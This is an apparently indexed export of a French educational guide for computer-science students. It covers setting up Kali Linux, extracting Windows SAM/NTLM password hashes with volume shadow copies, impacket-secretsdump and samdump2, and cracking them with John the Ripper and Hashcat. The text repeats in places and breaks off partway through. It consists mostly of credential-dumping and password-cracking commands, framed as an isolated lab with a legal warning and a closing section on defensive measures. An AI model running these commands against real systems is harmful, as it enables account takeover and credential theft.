\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 letmein \u2502 \u2500 hash \u2500\u2500\u25b6\u2502 MD4(mot) \u2502\u2500\u2500compare\u2500\u25b6 \u2713 TROUV\u00c9 ! \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 Installation et v\u00e9rification de John # John est pr\u00e9install\u00e9 sur Kali, v\u00e9rifier la version john --version # Si absent, installer sudo apt install john -y Pr\u00e9parer le fichier de hachages Assurez-vous que votre fichier hashes.txt contient les hachages au format correct : cat hashes.txt # Attendu : # etudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: Si vous n'avez que le hachage NTLM brut, cr\u00e9ez un fichier au bon format : echo \"etudiant:8846f7eaee8fb117ad06bdd830b7586c\" > hashes_ntlm.txt Wordlist \u2014 Rockyou.txt Kali inclut le c\u00e9l\u00e8bre dictionnaire rockyou.txt contenant plus de 14 millions de mots de passe r\u00e9els issus de fuites de donn\u00e9es : # Localiser rockyou.txt locate rockyou.txt # Il se trouve g\u00e9n\u00e9ralement ici : ls -lh /usr/share/wordlists/rockyou.txt.gz # D\u00e9compresser si n\u00e9cessaire sudo gunzip /usr/share/wordlists/rockyou.txt.gz # V\u00e9rifier le nombre de lignes wc -l /usr/share/wordlists/rockyou.txt # \u2192 14 344 391 mots de passe Lancer l'attaque par dictionnaire Attaque basique avec rockyou.txt john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt Attaque avec format auto-d\u00e9tect\u00e9 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt Attaque avec r\u00e8gles de transformation (mangling rules) Les r\u00e8gles appliquent des transformations automatiques sur chaque mot du dictionnaire (majuscules, ajout de chiffres, substitutions, etc.) : # R\u00e8gles par d\u00e9faut de John john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt # R\u00e8gles Jumbo (plus compl\u00e8tes, Kali inclut John Jumbo) john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules=jumbo hashes.txt Exemples de transformations appliqu\u00e9es par les r\u00e8gles : password \u2192 Password, PASSWORD, p@ssword, passw0rd, password123 admin \u2192 Admin, ADMIN, adm1n, admin!, Admin2024 Attaque avec un dictionnaire personnalis\u00e9 # Cr\u00e9er un dictionnaire cibl\u00e9 cat > mon_dico.txt << EOF azerty Azerty123 motdepasse Motdepasse1 NomEntreprise2024 Kali@2024 EOF john --format=NT --wordlist=mon_dico.txt hashes.txt Suivre la progression # Pendant l'attaque, appuyez sur Entr\u00e9e pour voir la progression # Ou dans un autre terminal : john --status # Affichage typique : # 0g 0:00:00:12 3.2% (ETA: 14:35:22) 0g/s 1842Kp/s 1842Kc/s # g = mots de passe trouv\u00e9s, p/s = mots test\u00e9s par seconde Afficher les mots de passe trouv\u00e9s # Afficher les r\u00e9sultats trouv\u00e9s john --show hashes.txt # Afficher uniquement les hachages NT john --show --format=NT hashes.txt Exemple de r\u00e9sultat : etudiant:password:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: 1 password hash cracked, 0 left Conseil : John sauvegarde automatiquement sa progression dans ~/.john/john.pot . Pour relancer une attaque sur un hachage d\u00e9j\u00e0 crack\u00e9, supprimez cette entr\u00e9e ou utilisez --pot=fichier_different.pot . 05 \u2014 Attaque par Force Brute avec John the Ripper Principe de l'attaque par force brute La force brute teste toutes les combinaisons possibles de caract\u00e8res selon un jeu de caract\u00e8res et une longueur d\u00e9finis. Elle est exhaustive mais tr\u00e8s lente \u2014 particuli\u00e8rement sur les mots de passe longs. Jeu de caract\u00e8res : a-z (26 lettres) Longueur : 4 caract\u00e8res Combinaisons : 26^4 = 456 976 aaaa \u2192 aab \u2192 aac \u2192 ... \u2192 zzzz \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Toutes les combinaisons sont \u2502 \u2502 test\u00e9es sans exception \u2502 \u2502 \u2713 Garantit de trouver le MDP \u2502 \u2502 \u2717 Peut prendre tr\u00e8s longtemps\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 Modes de force brute dans John John the Ripper utilise les masques pour d\u00e9finir pr\u00e9cis\u00e9ment le jeu de caract\u00e8res \u00e0 utiliser. Jeux de caract\u00e8res disponibles (charsets) Symbole Caract\u00e8res inclus ?l Minuscules : a-z ?u Majuscules : A-Z ?d Chiffres : 0-9 ?s Symboles : !@#$%^&* etc. ?a Tous : minuscules + majuscules + chiffres + symboles ?h Hexad\u00e9cimal bas : 0-9a-f Attaque force brute \u2014 Mode Incremental (automatique) Le mode --incremental de John teste toutes les combinaisons de longueur croissante automatiquement : # Force brute compl\u00e8te (tr\u00e8s lent, toutes longueurs et tous caract\u00e8res) john --format=NT --incremental hashes.txt # Force brute sur chiffres uniquement (codes PIN, etc.) john --format=NT --incremental=Digits hashes.txt # Force brute sur minuscules uniquement john --format=NT --incremental=Lower hashes.txt # Force brute sur minuscules + chiffres john --format=NT --incremental=LowerNum hashes.txt # Force brute sur l'alphabet complet john --format=NT --incremental=Alpha hashes.txt Attaque force brute \u2014 Mode Masque (recommand\u00e9) Le mode masque permet de cibler pr\u00e9cis\u00e9ment la structure du mot de passe, ce qui est beaucoup plus efficace : # Mot de passe de 4 caract\u00e8res, minuscules uniquement john --format=NT --mask='?l?l?l?l' hashes.txt # Mot de passe de 6 chiffres (code PIN) john --format=NT --mask='?d?d?d?d?d?d' hashes.txt # Mot de passe de 8 caract\u00e8res : 1 majuscule + 5 minuscules + 2 chiffres john --format=NT --mask='?u?l?l?l?l?l?d?d' hashes.txt # Mot de passe de longueur variable (6 \u00e0 8 caract\u00e8res, tout type) john --format=NT --mask='?a?a?a?a?a?a' --min-length=6 --max-length=8 hashes.txt # Mot de passe commen\u00e7ant par une majuscule, suivi de minuscules et finissant par des chiffres john --format=NT --mask='?u?l?l?l?l?d?d?d' hashes.txt Exemple pratique \u2014 mot de passe type \"Prenom2024\" # Structure : 1 majuscule + minuscules (longueur variable) + 4 chiffres # On suppose 5 minuscules + 4 chiffres john --format=NT --mask='?u?l?l?l?l?l?d?d?d?d' hashes.txt Combiner force brute et dictionnaire (attaque hybride) Une attaque hybride combine un dictionnaire avec des mutations en suffixe/pr\u00e9fixe : # Dictionnaire + chiffres en suffixe (ex: password123, admin2024) john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt \\ --mask='?w?d?d?d?d' hashes.txt # Dictionnaire + symbole + chiffres john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt \\ --mask='?w?s?d?d' hashes.txt Rappel : ?w repr\u00e9sente le mot courant du dictionnaire dans une attaque hybride. Limiter le temps d'ex\u00e9cution # Arr\u00eater apr\u00e8s 1 heure john --format=NT --incremental hashes.txt --max-run-time=3600 # Arr\u00eater apr\u00e8s avoir trouv\u00e9 N mots de passe john --format=NT --incremental hashes.txt --max-crack=1 Reprendre une attaque interrompue John sauvegarde automatiquement sa progression : # Reprendre l\u00e0 o\u00f9 l'attaque s'est arr\u00eat\u00e9e john --restore # Reprendre une session nomm\u00e9e john --restore=nom_session # Lancer une attaque avec un nom de session john --format=NT --incremental hashes.txt --session=ma_session 06 \u2014 Analyse des R\u00e9sultats Afficher tous les mots de passe crack\u00e9s # Afficher les r\u00e9sultats depuis le fichier pot john --show hashes.txt # Format d\u00e9taill\u00e9 john --show --format=NT hashes.txt Lire le fichier .pot directement cat ~/.john/john.pot # Format : $NT$hash:motdepasse_en_clair Comparer les performances M\u00e9thode Vitesse typique Efficacit\u00e9 Dictionnaire (rockyou) ~5\u201310 millions/s \u00c9lev\u00e9e sur mots courants Dictionnaire + r\u00e8gles ~1\u20133 millions/s Tr\u00e8s \u00e9lev\u00e9e Force brute (masque court) ~500K\u20132M/s Totale mais lente Force brute (incr\u00e9mental) Variable Garantie mais peut prendre des ann\u00e9es Remarque : Les performances d\u00e9pendent fortement du mat\u00e9riel. Un GPU d\u00e9di\u00e9 avec Hashcat est bien plus rapide que John sur CPU pour la force brute pure. Interpr\u00e9ter les r\u00e9sultats etudiant:password \u2192 Mot de passe tr\u00e8s faible, pr\u00e9sent dans rockyou.txt admin:Admin2024! \u2192 Crack\u00e9 par r\u00e8gles (majuscule + ann\u00e9e + symbole) root:[non trouv\u00e9] \u2192 Mot de passe fort ou absent du dictionnaire Aller plus loin \u2014 Hashcat (GPU) Pour des attaques plus rapides avec un GPU : # Installation sudo apt install hashcat -y # Attaque dictionnaire sur hachages NTLM (mode -m 1000) hashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt # Force brute NTLM, 8 caract\u00e8res, tout type hashcat -m 1000 -a 3 hashes_ntlm.txt '?a?a?a?a?a?a?a?a' # R\u00e8gles de transformation hashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule 07 \u2014 Commandes de R\u00e9f\u00e9rence Rapide John the Ripper # V\u00e9rifier la version john --version # Attaque par dictionnaire (format NT) john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt # Attaque par dictionnaire avec r\u00e8gles john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt # Force brute incr\u00e9mentale john --format=NT --incremental hashes.txt # Force brute par masque (ex: 8 caract\u00e8res tout type) john --format=NT --mask='?a?a?a?a?a?a?a?a' hashes.txt # Afficher les r\u00e9sultats trouv\u00e9s john --show hashes.txt # Voir la progression john --status # Reprendre une session john --restore Extraction des hachages # Avec impacket (\u00e0 distance) impacket-secretsdump Administrateur:'mdp'@IP_CIBLE # Avec samdump2 (fichiers locaux) samdump2 SYSTEM SAM > hashes.txt # D\u00e9compresser rockyou.txt sudo gunzip /usr/share/wordlists/rockyou.txt.gz Utilitaires divers # Localiser les wordlists disponibles sur Kali ls /usr/share/wordlists/ # Compter les lignes d'un dictionnaire wc -l /usr/share/wordlists/rockyou.txt # Supprimer le fichier .pot (repartir de z\u00e9ro) rm ~/.john/john.pot # Afficher les formats support\u00e9s par John john --list=formats | grep -i NT Mesures de protection (perspective d\u00e9fensive) Ce laboratoire met en \u00e9vidence l'importance des bonnes pratiques de s\u00e9curit\u00e9 : Bonne pratique Raison Mots de passe longs (16+ caract\u00e8res) Rend la force brute impraticable Mots de passe complexes et uniques R\u00e9siste aux dictionnaires et aux r\u00e8gles D\u00e9sactiver LM Hash (d\u00e9j\u00e0 le cas sur Win Vista+) LM est trivial \u00e0 craquer Activer Windows Hello / MFA Rend le hash inutile sans le second facteur Principe du moindre privil\u00e8ge Limite l'impact d'un compte compromis Surveillance des \u00e9v\u00e9nements 4624/4625 D\u00e9tecte les tentatives de connexion suspectes Guide Kali Linux & Attaque SAM \u00b7 R\u00e9f\u00e9rence pour \u00c9tudiants en Informatique \u00b7 Usage p\u00e9dagogique uniquement \u00b7 2025","title":"Guide Kali Linux &amp; Attaque de la Base SAM"},{"location":"kali/#guide-kali-linux-attaque-de-la-base-sam","text":"R\u00e9f\u00e9rence pour \u00c9tudiants en Informatique \u2014 S\u00e9curit\u00e9 offensive et tests de p\u00e9n\u00e9tration \u26a0\ufe0f Avertissement l\u00e9gal : Les techniques pr\u00e9sent\u00e9es dans ce document sont \u00e0 des fins strictement \u00e9ducatives dans un environnement de laboratoire isol\u00e9. Toute utilisation sur des syst\u00e8mes sans autorisation explicite est ill\u00e9gale et passible de poursuites p\u00e9nales. Ne pratiquez que sur vos propres machines ou dans un cadre p\u00e9dagogique autoris\u00e9.","title":"Guide Kali Linux &amp; Attaque de la Base SAM"},{"location":"kali/#table-des-matieres","text":"# Sujet 01 Installation de Kali Linux 02 Pr\u00e9sentation de la base SAM 03 Extraction des hachages SAM 04 Attaque par dictionnaire avec John the Ripper 05 Attaque par force brute avec John the Ripper 06 Analyse des r\u00e9sultats 07 Commandes de r\u00e9f\u00e9rence rapide","title":"Table des Mati\u00e8res"},{"location":"kali/#01-installation-de-kali-linux","text":"","title":"01 \u2014 Installation de Kali Linux"},{"location":"kali/#prerequis","text":"Composant Minimum Recommand\u00e9 RAM 2 Go 4 Go ou plus Stockage 20 Go 50 Go ou plus Processeur x64 double c\u0153ur x64 quad-c\u0153ur R\u00e9seau Facultatif Recommand\u00e9","title":"Pr\u00e9requis"},{"location":"kali/#options-dinstallation","text":"Il existe trois m\u00e9thodes principales pour installer Kali Linux : Machine virtuelle (VM) \u2014 id\u00e9al pour les d\u00e9butants, installation sur VirtualBox ou VMware sans affecter le syst\u00e8me h\u00f4te Dual boot \u2014 Kali cohabite avec Windows sur le m\u00eame disque Installation native \u2014 Kali comme syst\u00e8me principal (d\u00e9conseill\u00e9 pour les d\u00e9butants) Conseil : Pour ce guide, l'installation en machine virtuelle est recommand\u00e9e. Elle est s\u00fbre, r\u00e9versible et parfaite pour un environnement de lab.","title":"Options d'installation"},{"location":"kali/#methode-a-installation-sur-virtualbox-recommandee","text":"","title":"M\u00e9thode A \u2014 Installation sur VirtualBox (recommand\u00e9e)"},{"location":"kali/#etape-1-telecharger-liso-kali-linux","text":"Rendez-vous sur le site officiel : https://www.kali.org/get-kali/ Choisissez l'image Installer (64-bit) : kali-linux-2024.x-installer-amd64.iso V\u00e9rifiez l'int\u00e9grit\u00e9 du fichier avec la somme SHA256 fournie sur le site : # Sous Linux/macOS sha256sum kali-linux-2024.x-installer-amd64.iso # Sous Windows (PowerShell) Get-FileHash kali-linux-2024.x-installer-amd64.iso -Algorithm SHA256","title":"\u00c9tape 1 \u2014 T\u00e9l\u00e9charger l'ISO Kali Linux"},{"location":"kali/#etape-2-creer-la-machine-virtuelle","text":"Ouvrez VirtualBox \u2192 cliquez sur Nouvelle Renseignez les param\u00e8tres suivants : Nom : Kali Linux 2024 Type : Linux Version : Debian (64-bit) RAM : 4096 Mo (minimum 2048 Mo) Disque dur : Cr\u00e9er un nouveau disque virtuel VDI Taille disque : 50 Go (allocation dynamique) Avant de d\u00e9marrer, configurez les param\u00e8tres suppl\u00e9mentaires : Syst\u00e8me \u2192 Processeur : 2 CPU Affichage \u2192 M\u00e9moire vid\u00e9o : 128 Mo R\u00e9seau \u2192 Adaptateur 1 : Mode Pont (ou NAT selon votre besoin) Stockage \u2192 Lecteur optique : s\u00e9lectionner l'ISO Kali t\u00e9l\u00e9charg\u00e9","title":"\u00c9tape 2 \u2014 Cr\u00e9er la Machine Virtuelle"},{"location":"kali/#etape-3-demarrer-linstallation","text":"D\u00e9marrez la VM \u2192 le menu de d\u00e9marrage Kali s'affiche S\u00e9lectionnez Graphical Install","title":"\u00c9tape 3 \u2014 D\u00e9marrer l'Installation"},{"location":"kali/#etape-4-configuration-de-la-langue-et-du-clavier","text":"Langue : Fran\u00e7ais Pays : France (ou votre pays) Disposition clavier: Fran\u00e7ais (AZERTY)","title":"\u00c9tape 4 \u2014 Configuration de la langue et du clavier"},{"location":"kali/#etape-5-configuration-reseau","text":"Nom de la machine : kali-lab Domaine : (laisser vide)","title":"\u00c9tape 5 \u2014 Configuration r\u00e9seau"},{"location":"kali/#etape-6-creation-du-compte-utilisateur","text":"Nom complet : Etudiant Lab Nom d'utilisateur : etudiant Mot de passe : [choisir un mot de passe fort] Remarque : Depuis Kali 2020, le compte root n'est plus le compte par d\u00e9faut. Un utilisateur standard avec acc\u00e8s sudo est cr\u00e9\u00e9 \u00e0 la place.","title":"\u00c9tape 6 \u2014 Cr\u00e9ation du compte utilisateur"},{"location":"kali/#etape-7-partitionnement-du-disque","text":"S\u00e9lectionnez Utiliser un disque entier pour une installation simple en VM : Disque \u00e0 partitionner : VBOX HARDDISK (le disque virtuel) Sch\u00e9ma de partitionnement : Tout dans une seule partition \u2192 Terminer le partitionnement et appliquer les changements \u2192 Confirmer : Oui","title":"\u00c9tape 7 \u2014 Partitionnement du disque"},{"location":"kali/#etape-8-installation-du-systeme-de-base","text":"L'installation copie les fichiers syst\u00e8me (~10\u201320 minutes selon votre machine).","title":"\u00c9tape 8 \u2014 Installation du syst\u00e8me de base"},{"location":"kali/#etape-9-selection-des-logiciels","text":"Laissez la s\u00e9lection par d\u00e9faut : \u2705 Kali desktop environment (GNOME ou Xfce selon la version) \u2705 Top 10 \u2014 les 10 outils les plus utilis\u00e9s en pentest \u2705 Default recommended tools","title":"\u00c9tape 9 \u2014 S\u00e9lection des logiciels"},{"location":"kali/#etape-10-installation-du-chargeur-de-demarrage-grub","text":"Installer GRUB sur le disque principal : Oui P\u00e9riph\u00e9rique : /dev/sda","title":"\u00c9tape 10 \u2014 Installation du chargeur de d\u00e9marrage GRUB"},{"location":"kali/#etape-11-fin-de-linstallation","text":"Retirez l'ISO du lecteur virtuel Red\u00e9marrez la VM Connectez-vous avec les identifiants cr\u00e9\u00e9s \u00e0 l'\u00e9tape 6","title":"\u00c9tape 11 \u2014 Fin de l'installation"},{"location":"kali/#methode-b-image-virtualbox-pre-configuree-plus-rapide","text":"Kali propose des images VirtualBox et VMware pr\u00eates \u00e0 l'emploi : T\u00e9l\u00e9chargez l'image .ova sur https://www.kali.org/get-kali/#kali-virtual-machines Dans VirtualBox : Fichier \u2192 Importer un appareil virtuel S\u00e9lectionnez le fichier .ova \u2192 suivez l'assistant D\u00e9marrez la VM Identifiants par d\u00e9faut de l'image pr\u00e9-configur\u00e9e : Utilisateur : kali Mot de passe : kali \u26a0 \u00c0 modifier imm\u00e9diatement !","title":"M\u00e9thode B \u2014 Image VirtualBox pr\u00e9-configur\u00e9e (plus rapide)"},{"location":"kali/#mise-a-jour-post-installation","text":"Une fois connect\u00e9, ouvrez un terminal et mettez le syst\u00e8me \u00e0 jour : sudo apt update && sudo apt full-upgrade -y sudo apt autoremove -y V\u00e9rifiez la version install\u00e9e : cat /etc/os-release uname -a","title":"Mise \u00e0 jour post-installation"},{"location":"kali/#02-presentation-de-la-base-sam","text":"","title":"02 \u2014 Pr\u00e9sentation de la Base SAM"},{"location":"kali/#quest-ce-que-la-base-sam","text":"La SAM (Security Account Manager) est une base de donn\u00e9es Windows qui stocke les informations d'authentification des comptes utilisateurs locaux. Elle se trouve \u00e0 l'emplacement suivant : C:\\Windows\\System32\\config\\SAM","title":"Qu'est-ce que la base SAM ?"},{"location":"kali/#ce-que-contient-la-sam","text":"La SAM ne stocke jamais les mots de passe en clair. Elle conserve des hachages cryptographiques : Format Description Exemple LM Hash Ancien format (< Windows Vista), tr\u00e8s faible aad3b435b51404ee NTLM Hash Format actuel, MD4 du mot de passe en UTF-16 31d6cfe0d16ae931b73c59d7e0c089c0","title":"Ce que contient la SAM"},{"location":"kali/#architecture-de-protection","text":"\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Base de registre Windows \u2502 \u2502 \u2502 \u2502 HKLM\\SAM \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\u2500\u2500\u25b6 Chiffr\u00e9 par SYSKEY \u2502 HKLM\\SYSTEM (contient la cl\u00e9) \u2500\u2500 \u2502\u2500\u2500\u25b6 N\u00e9cessaire pour d\u00e9chiffrer \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 Fichiers physiques : C:\\Windows\\System32\\config\\SAM C:\\Windows\\System32\\config\\SYSTEM Concept cl\u00e9 : La SAM est verrouill\u00e9e par Windows en cours d'ex\u00e9cution. Il est impossible de la copier directement depuis un Windows d\u00e9marr\u00e9. Il faut passer par des m\u00e9thodes alternatives (volume shadow copy, d\u00e9marrage live, etc.).","title":"Architecture de protection"},{"location":"kali/#03-extraction-des-hachages-sam","text":"","title":"03 \u2014 Extraction des Hachages SAM"},{"location":"kali/#environnement-du-lab","text":"Pour ce laboratoire, nous utilisons : Machine cible : Windows 11 (VM VirtualBox) Machine attaquante : Kali Linux (VM VirtualBox) R\u00e9seau : R\u00e9seau interne VirtualBox (isol\u00e9) Acc\u00e8s requis : Administrateur local sur la cible Windows \u26a0\ufe0f Ce lab n\u00e9cessite un acc\u00e8s administrateur pr\u00e9alable sur la machine Windows cible. L'objectif est d'extraire et craquer les hachages, pas de contourner l'authentification Windows.","title":"Environnement du lab"},{"location":"kali/#methode-1-extraction-via-volume-shadow-copy-depuis-windows","text":"Cette m\u00e9thode fonctionne depuis Windows avec des droits administrateur, sans d\u00e9marrer sur un live CD. Sur la machine Windows 11 cible , ouvrez un Invite de commandes en tant qu'Administrateur :","title":"M\u00e9thode 1 \u2014 Extraction via Volume Shadow Copy (depuis Windows)"},{"location":"kali/#etape-1-creer-un-cliche-instantane-du-volume","text":"wmic shadowcopy call create Volume='C:\\'","title":"\u00c9tape 1 \u2014 Cr\u00e9er un clich\u00e9 instantan\u00e9 du volume"},{"location":"kali/#etape-2-identifier-lid-du-cliche-cree","text":"vssadmin list shadows Notez le chemin du dernier clich\u00e9, par exemple : \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1","title":"\u00c9tape 2 \u2014 Identifier l'ID du clich\u00e9 cr\u00e9\u00e9"},{"location":"kali/#etape-3-copier-les-fichiers-sam-et-system","text":"copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Temp\\SAM copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM","title":"\u00c9tape 3 \u2014 Copier les fichiers SAM et SYSTEM"},{"location":"kali/#etape-4-transferer-les-fichiers-vers-kali","text":"Transf\u00e9rez SAM et SYSTEM vers votre machine Kali (via dossier partag\u00e9 VM, cl\u00e9 USB virtuelle, ou scp ).","title":"\u00c9tape 4 \u2014 Transf\u00e9rer les fichiers vers Kali"},{"location":"kali/#methode-2-extraction-avec-impacket-secretsdump-depuis-kali","text":"Si vous disposez des identifiants d'un compte administrateur Windows, vous pouvez extraire les hachages \u00e0 distance depuis Kali : # Installation d'impacket si n\u00e9cessaire sudo apt install python3-impacket -y # Extraction \u00e0 distance impacket-secretsdump Administrateur:'MotDePasse'@192.168.1.50 R\u00e9sultat attendu : [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Invit\u00e9:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: etudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::","title":"M\u00e9thode 2 \u2014 Extraction avec impacket-secretsdump (depuis Kali)"},{"location":"kali/#methode-3-extraction-avec-samdump2-fichiers-copies","text":"Si vous avez r\u00e9cup\u00e9r\u00e9 les fichiers SAM et SYSTEM physiques : # Installation sudo apt install samdump2 -y # Extraction des hachages samdump2 SYSTEM SAM > hashes.txt # V\u00e9rifier le contenu cat hashes.txt R\u00e9sultat typique : Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: etudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::","title":"M\u00e9thode 3 \u2014 Extraction avec samdump2 (fichiers copi\u00e9s)"},{"location":"kali/#format-des-hachages-ntlm","text":"nom_utilisateur : RID : LM_hash : NTLM_hash ::: \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2514\u2500\u2500 Hachage MD4 du mot de passe (32 caract\u00e8res hex) \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 LM hash (d\u00e9sactiv\u00e9 sur Win Vista+, valeur vide) \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Identifiant relatif (500 = Administrateur) \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Nom du compte","title":"Format des hachages NTLM"},{"location":"kali/#04-attaque-par-dictionnaire-avec-john-the-ripper","text":"","title":"04 \u2014 Attaque par Dictionnaire avec John the Ripper"},{"location":"kali/#principe-de-lattaque-par-dictionnaire","text":"Une attaque par dictionnaire teste une liste de mots de passe courants (le dictionnaire ) en les hachant un par un et en comparant le r\u00e9sultat au hachage cible. Elle est rapide et efficace contre les mots de passe faibles ou courants. Dictionnaire John the Ripper Hachage cible \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 password \u2502 \u2500 hash \u2500\u2500\u25b6\u2502 MD4(mot) \u2502\u2500\u2500compare\u2500\u25b6\u2502 8846f7ea... \u2502 \u2502 123456 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2717 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 azerty \u2502 \u2502 \u2502 admin \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 letmein \u2502 \u2500 hash \u2500\u2500\u25b6\u2502 MD4(mot) \u2502\u2500\u2500compare\u2500\u25b6 \u2713 TROUV\u00c9 ! \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518","title":"Principe de l'attaque par dictionnaire"},{"location":"kali/#installation-et-verification-de-john","text":"# John est pr\u00e9install\u00e9 sur Kali, v\u00e9rifier la version john --version # Si absent, installer sudo apt install john -y","title":"Installation et v\u00e9rification de John"},{"location":"kali/#preparer-le-fichier-de-hachages","text":"Assurez-vous que votre fichier hashes.txt contient les hachages au format correct : cat hashes.txt # Attendu : # etudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: Si vous n'avez que le hachage NTLM brut, cr\u00e9ez un fichier au bon format : echo \"etudiant:8846f7eaee8fb117ad06bdd830b7586c\" > hashes_ntlm.txt","title":"Pr\u00e9parer le fichier de hachages"},{"location":"kali/#wordlist-rockyoutxt","text":"Kali inclut le c\u00e9l\u00e8bre dictionnaire rockyou.txt contenant plus de 14 millions de mots de passe r\u00e9els issus de fuites de donn\u00e9es : # Localiser rockyou.txt locate rockyou.txt # Il se trouve g\u00e9n\u00e9ralement ici : ls -lh /usr/share/wordlists/rockyou.txt.gz # D\u00e9compresser si n\u00e9cessaire sudo gunzip /usr/share/wordlists/rockyou.txt.gz # V\u00e9rifier le nombre de lignes wc -l /usr/share/wordlists/rockyou.txt # \u2192 14 344 391 mots de passe","title":"Wordlist \u2014 Rockyou.txt"},{"location":"kali/#lancer-lattaque-par-dictionnaire","text":"","title":"Lancer l'attaque par dictionnaire"},{"location":"kali/#attaque-basique-avec-rockyoutxt","text":"john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt","title":"Attaque basique avec rockyou.txt"},{"location":"kali/#attaque-avec-format-auto-detecte","text":"john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt","title":"Attaque avec format auto-d\u00e9tect\u00e9"},{"location":"kali/#attaque-avec-regles-de-transformation-mangling-rules","text":"Les r\u00e8gles appliquent des transformations automatiques sur chaque mot du dictionnaire (majuscules, ajout de chiffres, substitutions, etc.) : # R\u00e8gles par d\u00e9faut de John john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt # R\u00e8gles Jumbo (plus compl\u00e8tes, Kali inclut John Jumbo) john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules=jumbo hashes.txt Exemples de transformations appliqu\u00e9es par les r\u00e8gles : password \u2192 Password, PASSWORD, p@ssword, passw0rd, password123 admin \u2192 Admin, ADMIN, adm1n, admin!, Admin2024","title":"Attaque avec r\u00e8gles de transformation (mangling rules)"},{"location":"kali/#attaque-avec-un-dictionnaire-personnalise","text":"# Cr\u00e9er un dictionnaire cibl\u00e9 cat > mon_dico.txt << EOF azerty Azerty123 motdepasse 